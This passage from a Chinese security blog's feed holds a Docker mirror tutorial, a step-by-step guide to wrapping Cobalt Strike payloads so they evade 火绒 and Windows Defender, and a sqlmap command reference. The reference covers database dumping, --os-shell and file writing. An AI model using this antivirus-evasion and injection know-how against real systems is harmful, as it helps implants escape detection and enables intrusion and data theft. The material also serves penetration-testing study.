src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241216134531561.png" alt="image-20241216134531251">后续就继续学习wireshark的使用吧~</p><p>安全之路还很长，需要大家持之以恒的不断学习~</p>]]></content>
      
      
      <categories>
          
          <category> 渗透经验分享 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Docker更换镜像源教程</title>
      <link href="/2024/12/16/Docker%E6%9B%B4%E6%8D%A2%E9%95%9C%E5%83%8F%E6%BA%90%E6%95%99%E7%A8%8B/"/>
      <url>/2024/12/16/Docker%E6%9B%B4%E6%8D%A2%E9%95%9C%E5%83%8F%E6%BA%90%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p><font style="color:rgb(78, 83, 88);">因为</font><strong><font style="color:rgb(78, 83, 88);">国内现在封锁了Docker默认拉取镜像的站点（DockerHub），而且国内大部分Docker镜像站已全部下线</font></strong><font style="color:rgb(78, 83, 88);">，导致现在很多朋友在拉取镜像的时候会出现无法拉取的现象，这时候</font><strong><font style="color:rgb(78, 83, 88);">就需要进行更换Docker镜像源。</font></strong></p><h1 id="教程正文"><a href="#教程正文" class="headerlink" title="教程正文"></a>教程正文</h1><p><font style="color:rgb(78, 83, 88);">使用你喜欢的文本编辑器编辑</font><strong><font style="color:rgb(78, 83, 88);"> </font></strong><code>**&lt;font style=&quot;color:rgb(255, 60, 152);&quot;&gt;/etc/docker/daemon.json&lt;/font&gt;**</code><strong><font style="color:rgb(78, 83, 88);"> </font></strong><font style="color:rgb(78, 83, 88);">文件，如果文件不存在，则会自动创建。</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi  /etc/docker/daemon.json</span><br></pre></td></tr></table></figure><p><font style="color:rgb(78, 83, 88);">在</font><font style="color:rgb(78, 83, 88);"> </font><code>**&lt;font style=&quot;color:rgb(255, 60, 152);&quot;&gt;/etc/docker/daemon.json&lt;/font&gt;**</code><font style="color:rgb(78, 83, 88);"> </font><font style="color:rgb(78, 83, 88);">文件中，将下面的内容复制到文件中。</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    &quot;registry-mirrors&quot;: [</span><br><span class="line"></span><br><span class="line">        &quot;https://docker.1panel.live&quot;</span><br><span class="line"></span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><font style="color:rgb(78, 83, 88);">保存文件后，重启一下Docker服务</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart docker</span><br></pre></td></tr></table></figure><p><font style="color:rgb(78, 83, 88);">输入命令：</font><code>**&lt;font style=&quot;color:rgb(255, 60, 152);&quot;&gt;docker info&lt;/font&gt;**</code><font style="color:rgb(78, 83, 88);">，看到Registry Mirrors有相关信息就是添加成功了，然后就可以试着拉取镜像了。</font></p><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241216133710158.png" alt="image-20241216133709958"></p><h1 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h1><ul><li><font style="color:rgb(78, 83, 88);">镜像源都是</font><strong><font style="color:rgb(78, 83, 88);">非国内的，可能会存在无法连接或者速度慢的情况！</font></strong></li><li><font style="color:rgb(78, 83, 88);">镜像源</font><strong><font style="color:rgb(78, 83, 88);">可能会失效！</font></strong></li></ul>]]></content>
      
      
      <categories>
          
          <category> 计算机基础知识 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Cobalt Strike免杀教程</title>
      <link href="/2024/12/16/CS%E5%85%8D%E6%9D%80%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/"/>
      <url>/2024/12/16/CS%E5%85%8D%E6%9D%80%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<p>1、<a href="https://github.com/safe6Sec/GolangBypassAV">GitHub下载开源免杀脚本（Go版本）</a></p><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241216133809776.png" alt="image-20241216133809576"></p><p>2、环境配置</p><p>首先我们要安装我们的依赖库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">go mod tidy//安装依赖库</span><br><span class="line">go build main.go//编译可执行文件</span><br><span class="line">go env -w GOPROXY=https://goproxy.cn,direct//设置Go代理</span><br></pre></td></tr></table></figure><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241216133813936.png" alt="image-20241216133813754">3、在自己的CS里面生成一个脚本<img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241216133817259.png" alt="image-20241216133817136"></p><p>木马的形式改为RAW格式<img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241216133819879.png" alt="image-20241216133819811"></p><p>将木马存放在刚刚的bypass的文件夹里<img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241216133824977.png" alt="image-20241216133824887"><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241216133828080.png" alt="image-20241216133827943"></p><p>启动后选择自己的需要编译的木马文件<strong>（名字自己改，然后全部选择默认即可）</strong></p><p><strong><font style="color:rgb(31, 35, 40);">暂时只支持windows系统编译!!!!</font></strong></p><p><font style="color:rgb(31, 35, 40);">默认payload位置C:\Users\Administrator\Desktop\payload.bin<br></font><font style="color:rgb(31, 35, 40);">执行下面命令,即可生成免杀(game.exe)</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">指定payload</span><br><span class="line">main.exe payload.bin</span><br><span class="line"></span><br><span class="line">不指定payload，直接运行即可</span><br><span class="line">main.exe</span><br></pre></td></tr></table></figure><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241216133831575.png">然后等待编译完成即可<img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241216133835005.png" alt="image-20241216133834849">会生成一个patch的文件，改名就可以了</p><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241216133838711.png" alt="image-20241216133838590"><font style="color:rgb(31, 35, 40);">免杀这块本来就不是web狗擅长的，而且作为一个web狗也没必要花太多时间来折腾这个，达到能用就行，不要追求全部免杀，能免杀目标就行。</font></p><p><font style="color:rgb(31, 35, 40);">这一个可以过火绒但是过不了windows，下面这个是可以过windows但是过不了火绒的</font><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241216133849142.png" alt="image-20241216133848920"><font style="color:rgb(31, 35, 40);">首先使用sgn.exe这个脚本生成一个sgn文件，然后再把他放到bypass里面就重新生成一个exe文件即可</font></p>]]></content>
      
      
      <categories>
          
          <category> 渗透经验分享 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Sqlmap使用方法总结</title>
      <link href="/2024/12/16/Sqlmap%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/"/>
      <url>/2024/12/16/Sqlmap%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p><font style="color:rgb(85, 85, 85);background-color:rgb(247, 247, 247) !important;">在网上找了很多教程,都是零零散散的,找到了两位位前辈的博客,应该是翻译的</font><a href="https://github.com/sqlmapproject/sqlmap/wiki/Usage"><font style="color:rgb(85, 85, 85);background-color:rgb(247, 247, 247) !important;">官方文档</font></a><font style="color:rgb(85, 85, 85);background-color:rgb(247, 247, 247) !important;">,感谢前辈们做出的贡献.希望能够帮助刚学网络安全的小白们</font></p><p><strong><font style="color:rgb(35, 38, 59);">本文参考:</font><strong><strong><font style="color:rgb(35, 38, 59);">漏洞人生</font></strong></strong><font style="color:rgb(35, 38, 59);">和</font>****<font style="color:rgb(35, 38, 59);">sqlmap用户手册中文版</font></strong></p><p><font style="color:rgb(35, 38, 59);">目录</font></p><ul><li><font style="color:rgb(35, 38, 59);">Sqlmap使用方法总结</font><ul><li><font style="color:rgb(35, 38, 59);">sqlmap简介</font></li><li><font style="color:rgb(35, 38, 59);">常用语句</font></li><li><font style="color:rgb(35, 38, 59);">sqlmap详细命令</font><ul><li><font style="color:rgb(35, 38, 59);">用法</font></li><li><font style="color:rgb(35, 38, 59);">选项</font></li><li><font style="color:rgb(35, 38, 59);">目标</font></li><li><font style="color:rgb(35, 38, 59);">请求</font></li><li><font style="color:rgb(35, 38, 59);">优化</font></li><li><font style="color:rgb(35, 38, 59);">注入</font></li><li><font style="color:rgb(35, 38, 59);">检测</font></li><li><font style="color:rgb(35, 38, 59);">技术</font></li><li><font style="color:rgb(35, 38, 59);">指纹识别</font></li><li><font style="color:rgb(35, 38, 59);">枚举</font></li><li><font style="color:rgb(35, 38, 59);">暴力破解</font></li><li><font style="color:rgb(35, 38, 59);">用户自定义函数注入</font></li><li><font style="color:rgb(35, 38, 59);">访问文件系统</font></li><li><font style="color:rgb(35, 38, 59);">访问操作系统</font></li><li><font style="color:rgb(35, 38, 59);">访问 Windows 注册表：</font></li><li><font style="color:rgb(35, 38, 59);">通用选项：</font></li><li><font style="color:rgb(35, 38, 59);">杂项</font></li></ul></li></ul></li></ul><h2 id="sqlmap简介"><a href="#sqlmap简介" class="headerlink" title="sqlmap简介"></a><font style="color:rgb(35, 38, 59);">sqlmap简介</font></h2><p><font style="color:rgb(35, 38, 59);">sqlmap支持五种不同的注入模式：</font></p><ul><li><font style="color:rgb(35, 38, 59);">基于布尔的盲注</font></li><li><font style="color:rgb(35, 38, 59);">基于时间的盲注</font></li><li><font style="color:rgb(35, 38, 59);">基于报错注入</font></li><li><font style="color:rgb(35, 38, 59);">联合查询注入</font></li><li><font style="color:rgb(35, 38, 59);">堆叠注入</font></li></ul><p><font style="color:rgb(35, 38, 59);">sqlmap支持九种不同的数据库：</font></p><p><font style="color:rgb(35, 38, 59);">MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase和SAP MaxDB</font></p><h2 id="常用语句"><a href="#常用语句" class="headerlink" title="常用语句"></a><font style="color:rgb(35, 38, 59);">常用语句</font></h2><ul><li><font style="color:rgb(35, 38, 59);">自动检测</font></li></ul><p><code>**&lt;font style=&quot;color:rgb(216, 59, 100);background-color:rgb(249, 242, 244);&quot;&gt;sqlmap -u http:/xxxxxx.xxx -batch&lt;/font&gt;**</code></p><ul><li><font style="color:rgb(35, 38, 59);">指定参数</font></li></ul><p><code>**&lt;font style=&quot;color:rgb(216, 59, 100);background-color:rgb(249, 242, 244);&quot;&gt;sqlmap -u http:/xxxxxx.xxx/?id=x&amp;param=x -p id&lt;/font&gt;**</code></p><ul><li><font style="color:rgb(35, 38, 59);">指定数据库类型</font></li></ul><p><code>**&lt;font style=&quot;color:rgb(216, 59, 100);background-color:rgb(249, 242, 244);&quot;&gt;sqlmap -u http:/xxxxxx.xxx –dbms mysql&lt;/font&gt;**</code></p><ul><li><font style="color:rgb(35, 38, 59);">从文件读取http请求报文</font></li></ul><p><code>**&lt;font style=&quot;color:rgb(216, 59, 100);background-color:rgb(249, 242, 244);&quot;&gt;sqlmap -r 1.txt -batch&lt;/font&gt;**</code></p><ul><li><font style="color:rgb(35, 38, 59);">设置cookie</font></li></ul><p><code>**&lt;font style=&quot;color:rgb(216, 59, 100);background-color:rgb(249, 242, 244);&quot;&gt;sqlmap -u http:/xxxxxx.xxx --cookie=&quot;JSESSION=asd&quot;&lt;/font&gt;**</code></p><ul><li><font style="color:rgb(35, 38, 59);">查询数据库</font></li></ul><p><code>**&lt;font style=&quot;color:rgb(216, 59, 100);background-color:rgb(249, 242, 244);&quot;&gt;sqlmap -u http:/xxxxxx.xxx --dbs&lt;/font&gt;**</code></p><ul><li><font style="color:rgb(35, 38, 59);">查询表</font></li></ul><p><code>**&lt;font style=&quot;color:rgb(216, 59, 100);background-color:rgb(249, 242, 244);&quot;&gt;sqlmap -u http:/xxxxxx.xxx -D 数据库名 --tables&lt;/font&gt;**</code></p><ul><li><font style="color:rgb(35, 38, 59);">查字段名</font></li></ul><p><code>**&lt;font style=&quot;color:rgb(216, 59, 100);background-color:rgb(249, 242, 244);&quot;&gt;sqlmap -u http:/xxxxxx.xxx -D 数据库名 -T 表名 --columns&lt;/font&gt;**</code></p><ul><li><font style="color:rgb(35, 38, 59);">爆数据</font></li></ul><p><code>**&lt;font style=&quot;color:rgb(216, 59, 100);background-color:rgb(249, 242, 244);&quot;&gt;sqlmap -u http:/xxxxxx.xxx -D 数据库名 -T 表名 -C &quot;字段名1，字段名2&quot;--dump&lt;/font&gt;**</code></p><ul><li><font style="color:rgb(35, 38, 59);">在数据库中搜索字段 &#x2F; 表 &#x2F; 数据库名</font></li></ul><p><code>**&lt;font style=&quot;color:rgb(216, 59, 100);background-color:rgb(249, 242, 244);&quot;&gt;sqlmap -u http:/xxxxxx.xxx --search -C/T/D admin,password&lt;/font&gt;**</code></p><ul><li><font style="color:rgb(35, 38, 59);">写入文件<br></font><code>**&lt;font style=&quot;color:rgb(216, 59, 100);background-color:rgb(249, 242, 244);&quot;&gt;sqlmap -u http://xxx.xxx -–file-dest &quot;要写入的文件在本地的路径&quot; –file-write &quot;目标路径&quot;&lt;/font&gt;**</code></li><li><font style="color:rgb(35, 38, 59);">调用shell</font></li></ul><p><code>**&lt;font style=&quot;color:rgb(216, 59, 100);background-color:rgb(249, 242, 244);&quot;&gt;sqlmap -u http://xxx.xxx --os-shell&lt;/font&gt;**</code></p><ul><li><font style="color:rgb(35, 38, 59);">tip: 是否跟随302跳转</font></li></ul><p><font style="color:rgb(35, 38, 59);">当注入页面错误的时候，自动跳转到另一个页面的时候需要跟随302，<br></font><font style="color:rgb(35, 38, 59);">当注入错误的时候，先报错再跳转的时候，不需要跟随302。<br></font><font style="color:rgb(35, 38, 59);">目的是要追踪到错误信息。</font></p><h2 id="sqlmap详细命令"><a href="#sqlmap详细命令" class="headerlink" title="sqlmap详细命令"></a><font style="color:rgb(35, 38, 59);">sqlmap详细命令</font></h2><h3 id="用法"><a href="#用法" class="headerlink" title="用法"></a><font style="color:rgb(35, 38, 59);">用法</font></h3><p><code>**&lt;font style=&quot;color:rgb(216, 59, 100);background-color:rgb(249, 242, 244);&quot;&gt;python sqlmap.py [选项]&lt;/font&gt;**</code></p><h3 id="选项"><a href="#选项" class="headerlink" title="选项"></a><font style="color:rgb(35, 38, 59);">选项</font></h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-h, --help            显示基本帮助信息并退出</span><br><span class="line">-hh                   显示高级帮助信息并退出</span><br><span class="line">--version             显示程序版本信息并退出</span><br><span class="line">-v VERBOSE            输出信息详细程度级别：0-6（默认为 1）</span><br></pre></td></tr></table></figure><h3 id="目标"><a href="#目标" class="headerlink" title="目标"></a><font style="color:rgb(35, 38, 59);">目标</font></h3><p><font style="color:rgb(35, 38, 59);">至少提供一个以下选项以指定目标</font></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-d DIRECT           直接连接数据库</span><br><span class="line">-u URL, --url=URL   目标 URL（例如：&quot;http://www.site.com/vuln.php?id=1&quot;）</span><br><span class="line">-l LOGFILE          从 Burp 或 WebScarab 代理的日志文件中解析目标地址</span><br><span class="line">-m BULKFILE         从文本文件中获取批量目标</span><br><span class="line">-r REQUESTFILE      从文件中读取 HTTP 请求</span><br><span class="line">-g GOOGLEDORK       使用 Google dork 结果作为目标</span><br><span class="line">-c CONFIGFILE       从 INI 配置文件中加载选项</span><br></pre></td></tr></table></figure><h3 id="请求"><a href="#请求" class="headerlink" title="请求"></a><font style="color:rgb(35, 38, 59);">请求</font></h3><p><font style="color:rgb(35, 38, 59);">以下选项可以指定连接目标地址的方式</font></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">--method=METHOD     强制使用提供的 HTTP 方法（例如：PUT）</span><br><span class="line">--data=DATA         使用 POST 发送数据串（例如：&quot;id=1&quot;）</span><br><span class="line">--param-del=PARA..  设置参数值分隔符（例如：&amp;）</span><br><span class="line">--cookie=COOKIE     指定 HTTP Cookie（例如：&quot;PHPSESSID=a8d127e..&quot;）</span><br><span class="line">--cookie-del=COO..  设置 cookie 分隔符（例如：;）</span><br><span class="line">--load-cookies=L..  指定以 Netscape/wget 格式存放 cookies 的文件</span><br><span class="line">--drop-set-cookie   忽略 HTTP 响应中的 Set-Cookie 参数</span><br><span class="line">--user-agent=AGENT  指定 HTTP User-Agent</span><br><span class="line">--random-agent      使用随机的 HTTP User-Agent</span><br><span class="line">--host=HOST         指定 HTTP Host</span><br><span class="line">--referer=REFERER   指定 HTTP Referer</span><br><span class="line">-H HEADER, --hea..  设置额外的 HTTP 头参数（例如：&quot;X-Forwarded-For: 127.0.0.1&quot;）</span><br><span class="line">--headers=HEADERS   设置额外的 HTTP 头参数（例如：&quot;Accept-Language: fr\nETag: 123&quot;）</span><br><span class="line">--auth-type=AUTH..  HTTP 认证方式（Basic，Digest，NTLM 或 PKI）</span><br><span class="line">--auth-cred=AUTH..  HTTP 认证凭证（username:password）</span><br><span class="line">--auth-file=AUTH..  HTTP 认证 PEM 证书/私钥文件</span><br><span class="line">--ignore-code=IG..  忽略（有问题的）HTTP 错误码（例如：401）</span><br><span class="line">--ignore-proxy      忽略系统默认代理设置</span><br><span class="line">--ignore-redirects  忽略重定向尝试</span><br><span class="line">--ignore-timeouts   忽略连接超时</span><br><span class="line">--proxy=PROXY       使用代理连接目标 URL</span><br><span class="line">--proxy-cred=PRO..  使用代理进行认证（username:password）</span><br><span class="line">--proxy-file=PRO..  从文件中加载代理列表</span><br><span class="line">--tor               使用 Tor 匿名网络</span><br><span class="line">--tor-port=TORPORT  设置 Tor 代理端口代替默认端口</span><br><span class="line">--tor-type=TORTYPE  设置 Tor 代理方式（HTTP，SOCKS4 或 SOCKS5（默认））</span><br><span class="line">--check-tor         检查是否正确使用了 Tor</span><br><span class="line">--delay=DELAY       设置每个 HTTP 请求的延迟秒数</span><br><span class="line">--timeout=TIMEOUT   设置连接响应的有效秒数（默认为 30）</span><br><span class="line">--retries=RETRIES   连接超时时重试次数（默认为 3）</span><br><span class="line">--randomize=RPARAM  随机更改给定的参数值</span><br><span class="line">--safe-url=SAFEURL  测试过程中可频繁访问且合法的 URL 地址（译者注：</span><br><span class="line">                    有些网站在你连续多次访问错误地址时会关闭会话连接，</span><br><span class="line">                    后面的“请求”小节有详细说明）</span><br><span class="line">--safe-post=SAFE..  使用 POST 方法发送合法的数据</span><br><span class="line">--safe-req=SAFER..  从文件中加载合法的 HTTP 请求</span><br><span class="line">--safe-freq=SAFE..  每访问两次给定的合法 URL 才发送一次测试请求</span><br><span class="line">--skip-urlencode    不对 payload 数据进行 URL 编码</span><br><span class="line">--csrf-token=CSR..  设置网站用来反 CSRF 攻击的 token</span><br><span class="line">--csrf-url=CSRFURL  指定可提取防 CSRF 攻击 token 的 URL</span><br><span class="line">--force-ssl         强制使用 SSL/HTTPS</span><br><span class="line">--hpp               使用 HTTP 参数污染攻击</span><br><span class="line">--eval=EVALCODE     在发起请求前执行给定的 Python 代码（例如：</span><br><span class="line">                    &quot;import hashlib;id2=hashlib.md5(id).hexdigest()&quot;）</span><br></pre></td></tr></table></figure><h3 id="优化"><a href="#优化" class="headerlink" title="优化"></a><font style="color:rgb(35, 38, 59);">优化</font></h3><p><font style="color:rgb(35, 38, 59);">以下选项用于优化 sqlmap 性能</font></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-o                  开启所有优化开关</span><br><span class="line">--predict-output    预测常用请求的输出</span><br><span class="line">--keep-alive        使用持久的 HTTP(S) 连接</span><br><span class="line">--null-connection   仅获取页面大小而非实际的 HTTP 响应</span><br><span class="line">--threads=THREADS   设置 HTTP(S) 请求并发数最大值（默认为 1）</span><br></pre></td></tr></table></figure><h3 id="注入"><a href="#注入" class="headerlink" title="注入"></a><font style="color:rgb(35, 38, 59);">注入</font></h3><p><font style="color:rgb(35, 38, 59);">以下选项用于指定要测试的参数，<br></font><font style="color:rgb(35, 38, 59);">提供自定义注入 payloads 和篡改参数的脚本</font></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">-p TESTPARAMETER    指定需要测试的参数</span><br><span class="line">--skip=SKIP         指定要跳过的参数</span><br><span class="line">--skip-static       指定跳过非动态参数</span><br><span class="line">--param-exclude=..  用正则表达式排除参数（例如：&quot;ses&quot;）</span><br><span class="line">--dbms=DBMS         指定后端 DBMS（Database Management System，</span><br><span class="line">                    数据库管理系统）类型（例如：MySQL）</span><br><span class="line">--dbms-cred=DBMS..  DBMS 认证凭据（username:password）</span><br><span class="line">--os=OS             指定后端 DBMS 的操作系统类型</span><br><span class="line">--invalid-bignum    将无效值设置为大数</span><br><span class="line">--invalid-logical   对无效值使用逻辑运算</span><br><span class="line">--invalid-string    对无效值使用随机字符串</span><br><span class="line">--no-cast           关闭 payload 构造机制</span><br><span class="line">--no-escape         关闭字符串转义机制</span><br><span class="line">--prefix=PREFIX     注入 payload 的前缀字符串</span><br><span class="line">--suffix=SUFFIX     注入 payload 的后缀字符串</span><br><span class="line">--tamper=TAMPER     用给定脚本修改注入数据</span><br></pre></td></tr></table></figure><h3 id="检测"><a href="#检测" class="headerlink" title="检测"></a><font style="color:rgb(35, 38, 59);">检测</font></h3><p><font style="color:rgb(35, 38, 59);">以下选项用于自定义检测方式</font></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">--level=LEVEL       设置测试等级（1-5，默认为 1）</span><br><span class="line">--risk=RISK         设置测试风险等级（1-3，默认为 1）</span><br><span class="line">--string=STRING     用于确定查询结果为真时的字符串</span><br><span class="line">--not-string=NOT..  用于确定查询结果为假时的字符串</span><br><span class="line">--regexp=REGEXP     用于确定查询结果为真时的正则表达式</span><br><span class="line">--code=CODE         用于确定查询结果为真时的 HTTP 状态码</span><br><span class="line">--text-only         只根据页面文本内容对比页面</span><br><span class="line">--titles            只根据页面标题对比页面</span><br></pre></td></tr></table></figure><h3 id="技术"><a href="#技术" class="headerlink" title="技术"></a><font style="color:rgb(35, 38, 59);">技术</font></h3><p><font style="color:rgb(35, 38, 59);">以下选项用于调整特定 SQL 注入技术的测试方法</font></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">--technique=TECH    使用的 SQL 注入技术（默认为“BEUSTQ”，译者注：</span><br><span class="line">                    B: Boolean-based blind SQL injection（布尔型盲注）</span><br><span class="line">                    E: Error-based SQL injection（报错型注入）</span><br><span class="line">                    U: UNION query SQL injection（联合查询注入）</span><br><span class="line">                    S: Stacked queries SQL injection（堆叠查询注入）</span><br><span class="line">                    T: Time-based blind SQL injection（时间型盲注）</span><br><span class="line">                    Q: inline Query injection（内联查询注入）</span><br><span class="line">--time-sec=TIMESEC  延迟 DBMS 的响应秒数（默认为 5）</span><br><span class="line">--union-cols=UCOLS  设置联合查询注入测试的列数目范围</span><br><span class="line">--union-char=UCHAR  用于暴力猜解列数的字符</span><br><span class="line">--union-from=UFROM  设置联合查询注入 FROM 处用到的表</span><br><span class="line">--dns-domain=DNS..  设置用于 DNS 渗出攻击的域名（译者注：</span><br><span class="line">                    推荐阅读《在SQL注入中使用DNS获取数据》</span><br><span class="line">                    http://cb.drops.wiki/drops/tips-5283.html，</span><br><span class="line">                    在后面的“技术”小节中也有相应解释）</span><br><span class="line">--second-url=SEC..  设置二阶响应的结果显示页面的 URL（译者注：</span><br><span class="line">                    该选项用于 SQL 二阶注入）</span><br><span class="line">--second-req=SEC..  从文件读取 HTTP 二阶请求</span><br></pre></td></tr></table></figure><h3 id="指纹识别"><a href="#指纹识别" class="headerlink" title="指纹识别"></a><font style="color:rgb(35, 38, 59);">指纹识别</font></h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-f, --fingerprint   执行广泛的 DBMS 版本指纹识别</span><br></pre></td></tr></table></figure><h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a><font style="color:rgb(35, 38, 59);">枚举</font></h3><p><font style="color:rgb(35, 38, 59);">以下选项用于获取后端 DBMS 的信息，结构和数据表中的数据。<br></font><font style="color:rgb(35, 38, 59);">此外，还可以运行你输入的 SQL 语句</font></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">-a, --all           获取所有信息、数据</span><br><span class="line">-b, --banner        获取 DBMS banner</span><br><span class="line">--current-user      获取 DBMS 当前用户</span><br><span class="line">--current-db        获取 DBMS 当前数据库</span><br><span class="line">--hostname          获取 DBMS 服务器的主机名</span><br><span class="line">--is-dba            探测 DBMS 当前用户是否为 DBA（数据库管理员）</span><br><span class="line">--users             枚举出 DBMS 所有用户</span><br><span class="line">--passwords         枚举出 DBMS 所有用户的密码哈希</span><br><span class="line">--privileges        枚举出 DBMS 所有用户特权级</span><br><span class="line">--roles             枚举出 DBMS 所有用户角色</span><br><span class="line">--dbs               枚举出 DBMS 所有数据库</span><br><span class="line">--tables            枚举出 DBMS 数据库中的所有表</span><br><span class="line">--columns           枚举出 DBMS 表中的所有列</span><br><span class="line">--schema            枚举出 DBMS 所有模式</span><br><span class="line">--count             获取数据表数目</span><br><span class="line">--dump              导出 DBMS 数据库表项</span><br><span class="line">--dump-all          导出所有 DBMS 数据库表项</span><br><span class="line">--search            搜索列，表和/或数据库名</span><br><span class="line">--comments          枚举数据时检查 DBMS 注释</span><br><span class="line">-D DB               指定要枚举的 DBMS 数据库</span><br><span class="line">-T TBL              指定要枚举的 DBMS 数据表</span><br><span class="line">-C COL              指定要枚举的 DBMS 数据列</span><br><span class="line">-X EXCLUDE          指定不枚举的 DBMS 标识符</span><br><span class="line">-U USER             指定枚举的 DBMS 用户</span><br><span class="line">--exclude-sysdbs    枚举所有数据表时，指定排除特定系统数据库</span><br><span class="line">--pivot-column=P..  指定主列</span><br><span class="line">--where=DUMPWHERE   在转储表时使用 WHERE 条件语句</span><br><span class="line">--start=LIMITSTART  指定要导出的数据表条目开始行数</span><br><span class="line">--stop=LIMITSTOP    